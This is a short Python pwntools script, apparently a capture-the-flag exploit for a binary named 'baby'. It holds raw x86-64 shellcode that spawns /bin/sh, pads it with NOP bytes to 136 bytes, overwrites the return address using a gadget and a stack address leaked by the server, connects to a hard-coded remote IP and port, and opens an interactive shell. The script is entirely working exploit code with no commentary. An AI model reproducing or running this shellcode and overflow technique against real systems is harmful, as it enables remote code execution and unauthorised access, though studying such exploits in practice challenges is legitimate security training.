
from pwn import *
import sys

shell = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# r = process('./baby')
r = remote('142.93.113.134', 9999)

l = r.recvline().split()[-1:]

shell += b'\x90' * (136 - len(shell))

shell += p64(0x0400496) + p64(int(l[0], 16))

# sys.stdout.buffer.write(shell)

r.sendline(shell)

r.interactive()
